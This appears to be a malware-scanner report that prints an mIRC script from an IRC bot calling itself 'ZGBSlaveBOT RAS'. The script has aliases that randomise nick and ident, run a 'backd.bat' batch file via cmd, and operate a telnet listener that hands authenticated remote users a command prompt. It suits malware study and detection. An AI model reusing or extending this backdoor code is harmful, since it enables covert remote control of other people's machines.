behavior.run: May run an executable file or a system command

docinfo.macro:
[aliases]
n0=/op /mode # +ooo $$1 $2 $3
n1=/dop /mode # -ooo $$1 $2 $3
n2=/j /join #$$1 $2-
n3=/p /part #
n4=/n /names #$$1
n5=/w /whois $$1
n6=/k /kick # $$1 $2-
n7=/q /query $$1
n8=/send /dcc send $1 $2
n9=/chat /dcc chat $1
n10=/ping /ctcp $$1 ping
n11=/s /server $$1-
n12=/rnick { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }
n13=/rident { /identd off
n14=/identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }
n15=/servcon { 
n16=  //rnick
n17=  //rident
n18=  //server %irchost 
n19=}
n20=/backd { //run cmd /c backd.bat }
n21=/tlntvok {
n22=  sockwrite tlntclient You recognized. $crlf
n23=  sockwrite tlntclient Welcome to ZGBSlaveBOT RAS. $crlf
n24=  sockwrite tlntclient BOT Version is - %version $crlf
n25=  sockwrite tlntclient This is $host $crlf
n26=  sockwrite tlntclient Awaiting commands... $crlf
n27=  set %auth yes
n28=}
n29=
n30=/tlntvfailure {
n31=  sockwrite tlntclient Validation failure. $crlf
n32=  set %auth no 
n33=  sockclose tlntserv 
n34=  sockclose tlntclient
n35=  socklisten tlntserv %tlntport 
n36=}

filetype: ASCII text, with CRLF line terminators

dump: n23=  sockwrite tlntclient Welcome to ZGBSlaveBOT RAS. $crlf
n24=  sockwrite tlntclient BOT Version is - %version $crlf
